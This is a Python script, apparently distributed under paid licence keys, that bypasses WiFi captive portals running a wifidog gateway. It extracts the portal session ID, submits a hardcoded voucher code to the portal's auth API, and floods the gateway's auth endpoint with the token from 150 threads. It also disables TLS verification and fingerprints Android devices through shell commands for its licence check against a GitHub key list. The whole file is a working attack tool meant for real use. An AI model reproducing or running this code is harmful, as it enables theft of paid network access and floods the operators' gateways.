#!/usr/bin/env python3
# Aladdin Starlink Bypass - Immortal V14 (Admin Revocation System)

import requests, re, urllib3, time, threading, os, random, hashlib, ssl, json
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# ==================== COLOR SCHEME ====================
class Colors:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    BOLD = "\033[1m"
    DIM = "\033[2m"

bred = Colors.RED
bgreen = Colors.GREEN
bcyan = Colors.CYAN
byellow = Colors.YELLOW
bbold = Colors.BOLD
bdim = Colors.DIM
reset = Colors.RESET

# ==================== SSL & WARNING BYPASS ====================
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIGURATION ====================
KEY_URL = "https://raw.githubusercontent.com/paingkhant2701199/Cyber/main/Leo_Cyber.txt"
LICENSE_FILE = ".Leo_Cyber.lic"
REVOKE_CHECK_INTERVAL = 30  # Online check every 30 seconds when internet is available

# ==================== DEVICE ID ====================
def get_hwid():
    ID_STORAGE = ".device_id"
    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()
    try:
        serial = subprocess.check_output("getprop ro.serialno", shell=True).decode().strip()
        if not serial or serial == "unknown" or "012345" in serial:
            serial = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
        if not serial:
            import uuid
            serial = str(uuid.getnode())
        raw_hash = hashlib.md5(serial.encode()).hexdigest()[:10].upper()
        new_id = f"TRB-{raw_hash}"
    except:
        new_id = f"TRB-{hashlib.md5(str(os.getlogin()).encode()).hexdigest()[:10].upper()}"
    with open(ID_STORAGE, "w") as f:
        f.write(new_id)
    return new_id

# ==================== LICENSE SAVE/LOAD ====================
def save_license(hwid, key, expiry):
    data = {"id": hwid, "key": key, "expiry": expiry}
    with open(LICENSE_FILE, "w") as f:
        json.dump(data, f)

def load_license():
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                return json.load(f)
        except:
            return None
    return None

def delete_license():
    if os.path.exists(LICENSE_FILE):
        os.remove(LICENSE_FILE)
        return True
    return False

# ==================== NETWORK CHECK ====================
def is_online():
    try:
        r = requests.get("http://www.google.com/generate_204", timeout=3)
        return r.status_code == 204
    except:
        return False

# ==================== CHECK IF DEVICE IS STILL IN DATABASE ====================
def check_device_status_online(hwid, current_key):
    """
    Returns:
        (True, expiry)   -> Device exists and valid
        (False, None)    -> Device REVOKED (deleted from DB or key changed)
        (None, None)     -> Cannot check (no internet)
    """
    try:
        response = requests.get(KEY_URL, timeout=10, verify=False).text
        lines = response.splitlines()
        
        for line in lines:
            if "|" in line:
                parts = line.split("|")
                if len(parts) == 3:
                    db_id, db_key, db_expiry = parts
                    if db_id.strip() == hwid:
                        # Device found - check if key matches
                        if db_key.strip() != current_key:
                            return False, None  # Key changed = REVOKED
                        # Check expiry
                        try:
                            expiry_date = datetime.strptime(db_expiry.strip(), "%d-%m-%Y")
                            if datetime.now() > expiry_date:
                                return False, None  # EXPIRED
                            return True, db_expiry.strip()
                        except:
                            return True, db_expiry.strip()
        # Device NOT found in database = REVOKED
        return False, None
    except Exception as e:
        return None, None  # No internet or GitHub down

# ==================== BANNER ====================
def banner():
    os.system('clear')
    print(f"{bred}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{reset}")
    print(f"{bred}┃{bgreen}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen} ⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}  ⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀ ⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀ ⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀ ⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀ ⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}")
    print(f"{bred}┃{reset}                                                         {bred}┃{reset}")
    print(f"{bred}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫{reset}")
    print(f"{bred}┃{bcyan}        🔥  LEO STARLINK BYPASS - V14 (REVOKE SYSTEM) 🔥          {bred}┃{reset}")
    print(f"{bred}┃{byellow}           ✨ Admin: @Paing07709 ✨                              {bred}┃{reset}")
    print(f"{bred}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}")
    print()

# ==================== LICENSE CHECK ====================
def check_license():
    hwid = get_hwid()
    banner()

    local_data = load_license()
    
    # ========== NO LOCAL LICENSE ==========
    if not local_data or local_data.get("id") != hwid:
        print(f"{bcyan}╔════════════════════════════════════════════════════════════╗{reset}")
        print(f"{bcyan}║  🔐 FIRST TIME ACTIVATION                                  ║{reset}")
        print(f"{bcyan}╚════════════════════════════════════════════════════════════╝{reset}")
        print(f"{byellow}[*] DEVICE ID: {hwid}{reset}")
        input_key = input(f"{bgreen}[>] ENTER KEY: {reset}").strip()

        print(f"{bdim}[*] Verifying online...{reset}")
        try:
            response = requests.get(KEY_URL, timeout=10, verify=False).text
            lines = response.splitlines()

            for line in lines:
                if "|" in line:
                    parts = line.split("|")
                    if len(parts) == 3:
                        db_id, db_key, db_date = parts
                        if db_id.strip() == hwid and db_key.strip() == input_key:
                            expiry_date = datetime.strptime(db_date.strip(), "%d-%m-%Y")
                            if datetime.now() < expiry_date:
                                save_license(hwid, input_key, db_date.strip())
                                print(f"{bgreen}✓ ACCESS GRANTED! Expires: {db_date}{reset}")
                                time.sleep(2)
                                return True
                            else:
                                print(f"{bred}✗ KEY EXPIRED!{reset}")
                                return False
            print(f"{bred}✗ INVALID KEY OR DEVICE NOT REGISTERED{reset}")
            return False
        except:
            print(f"{bred}✗ Cannot verify. Check internet.{reset}")
            return False

    # ========== LOCAL LICENSE EXISTS - CHECK REVOCATION ==========
    expiry_str = local_data.get("expiry", "")
    current_key = local_data.get("key", "")
    
    try:
        expiry_date = datetime.strptime(expiry_str, "%d-%m-%Y")
    except:
        delete_license()
        return False
    
    # Check if online
    online = is_online()
    
    if online:
        # CHECK REVOCATION STATUS FROM GITHUB
        print(f"{bdim}[*] Checking revocation status...{reset}")
        status, new_expiry = check_device_status_online(hwid, current_key)
        
        if status is False:
            # REVOKED or EXPIRED
            print(f"{bred}╔════════════════════════════════════════════════════════════╗{reset}")
            print(f"{bred}║  ✗ LICENSE REVOKED BY ADMIN!                              ║{reset}")
            print(f"{bred}║  ✗ Your device is no longer in database.                  ║{reset}")
            print(f"{bred}║  ✗ License deleted. Contact @Paing07709 to renew.         ║{reset}")
            print(f"{bred}╚════════════════════════════════════════════════════════════╝{reset}")
            delete_license()
            return False
        
        elif status is True:
            # Valid - update expiry if changed
            if new_expiry and new_expiry != expiry_str:
                save_license(hwid, current_key, new_expiry)
                expiry_date = datetime.strptime(new_expiry, "%d-%m-%Y")
                print(f"{bgreen}[✓] License updated: {new_expiry}{reset}")
            
            # Check normal expiry
            if datetime.now() > expiry_date:
                print(f"{bred}╔════════════════════════════════════════════════════════════╗{reset}")
                print(f"{bred}║  ✗ LICENSE EXPIRED!                                       ║{reset}")
                print(f"{bred}║  ✗ Expired on: {expiry_str}                                          ║{reset}")
                print(f"{bred}╚════════════════════════════════════════════════════════════╝{reset}")
                delete_license()
                return False
            
            # ALL GOOD
            print(f"{bgreen}╔════════════════════════════════════════════════════════════╗{reset}")
            print(f"{bgreen}║  ✓ LICENSE ACTIVE                                         ║{reset}")
            print(f"{bgreen}║  ✓ DEVICE: {hwid:<40} ║{reset}")
            print(f"{bgreen}║  ✓ EXPIRY: {expiry_str}                                              ║{reset}")
            print(f"{bgreen}╚════════════════════════════════════════════════════════════╝{reset}")
            time.sleep(2)
            return True
        
        else:  # status is None - can't check
            print(f"{byellow}╔════════════════════════════════════════════════════════════╗{reset}")
            print(f"{byellow}║  ⚠ OFFLINE MODE - Using cached license                   ║{reset}")
            print(f"{byellow}║  ⚠ Expiry: {expiry_str}                                              ║{reset}")
            print(f"{byellow}║  ⚠ Will re-check when internet available                 ║{reset}")
            print(f"{byellow}╚════════════════════════════════════════════════════════════╝{reset}")
            time.sleep(2)
            return True
    else:
        # OFFLINE - Use cached license without expiry check
        print(f"{byellow}╔════════════════════════════════════════════════════════════╗{reset}")
        print(f"{byellow}║  ⚠ OFFLINE MODE - Cached license active                    ║{reset}")
        print(f"{byellow}║  ⚠ Device: {hwid:<40} ║{reset}")
        print(f"{byellow}║  ⚠ Expiry check SKIPPED (offline)                          ║{reset}")
        print(f"{byellow}║  ⚠ Will revoke when internet returns                       ║{reset}")
        print(f"{byellow}╚════════════════════════════════════════════════════════════╝{reset}")
        time.sleep(2)
        return True

# ==================== HIGH SPEED PULSE ====================
def high_speed_pulse(link, stop_flag):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    while not stop_flag():
        try:
            requests.get(link, timeout=3, verify=False, headers=headers)
            time.sleep(0.01)
        except:
            time.sleep(0.5)

# ==================== BACKGROUND REVOCATION MONITOR ====================
revoked_flag = False

def revocation_monitor():
    global revoked_flag
    hwid = get_hwid()
    
    while not revoked_flag:
        time.sleep(REVOKE_CHECK_INTERVAL)
        
        if is_online():
            local = load_license()
            if local:
                status, _ = check_device_status_online(hwid, local.get("key", ""))
                if status is False:
                    print(f"\n{bred}╔════════════════════════════════════════════════════════════╗{reset}")
                    print(f"{bred}║  🔴 ADMIN REVOKED YOUR LICENSE!                            ║{reset}")
                    print(f"{bred}║  🔴 Tool will stop in 3 seconds.                           ║{reset}")
                    print(f"{bred}╚════════════════════════════════════════════════════════════╝{reset}")
                    delete_license()
                    revoked_flag = True
                    time.sleep(3)
                    os._exit(0)

# ==================== MAIN BYPASS ENGINE ====================
def start_immortal():
    global revoked_flag
    
    if not check_license():
        return
    
    # Start background revocation monitor
    monitor_thread = threading.Thread(target=revocation_monitor, daemon=True)
    monitor_thread.start()

    print(f"{bcyan}[*] Initializing Bypass Engine V14...{reset}")
    time.sleep(1)

    while not revoked_flag:
        session = requests.Session()
        try:
            print(f"{bdim}[*] Scanning captive portal...{reset}")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)

            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=5)
            match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, match.group(1)) if match else p_url
            r2 = session.get(n_url, verify=False, timeout=5)

            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]

            if sid:
                print(f"{bgreen}[✓] Session: {sid[:20]}...{reset}")
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", 
                           json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=3)

                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"

                print(f"{byellow}[*] Launching 150 threads...{reset}")
                stop_flag = lambda: revoked_flag
                for _ in range(150):
                    threading.Thread(target=high_speed_pulse, args=(auth_link, stop_flag), daemon=True).start()

                print(f"{bgreen}[✓] BYPASS ACTIVE! Monitoring...{reset}")
                
                while not revoked_flag:
                    if not is_online():
                        print(f"{bred}[!] Connection lost. Re-injecting...{reset}")
                        break
                    time.sleep(5)
            else:
                print(f"{byellow}[!] No session. Retrying...{reset}")
                time.sleep(3)
        except Exception as e:
            print(f"{bred}[!] Error: {str(e)[:50]}... Retrying{reset}")
            time.sleep(3)

if __name__ == "__main__":
    try:
        start_immortal()
    except KeyboardInterrupt:
        print(f"\n{bred}[!] Stopped.{reset}")
